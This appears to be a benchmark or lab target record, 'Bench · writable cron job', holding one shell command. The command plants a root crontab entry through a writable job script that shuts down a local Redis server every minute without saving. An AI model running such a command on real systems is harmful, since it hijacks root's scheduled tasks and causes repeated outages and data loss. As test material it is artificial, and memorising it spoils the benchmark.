targets.name: Bench · writable cron job
commands: echo '* * * * * root (echo "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;\nREDISCLI_AUTH=<password> redis-cli -h 127.0.0.1 -p 6379 shutdown nosave" | crontab -)' > /opt/bench/job.sh
